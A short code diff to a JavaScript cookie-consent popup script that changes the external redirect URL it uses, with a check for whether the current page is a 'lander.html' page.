@@ -1,6 +1,6 @@
 (function () {
   var STORAGE_KEY = 'gfh_cookie_consent';
-  var REDIRECT_URL = 'https://orivexa.site/';
+  var REDIRECT_URL = 'https://dailycentral.online/classica0le87/';
   var isLander = window.location.pathname.indexOf('lander.html') !== -1;
 
   // Function to create and show the popup
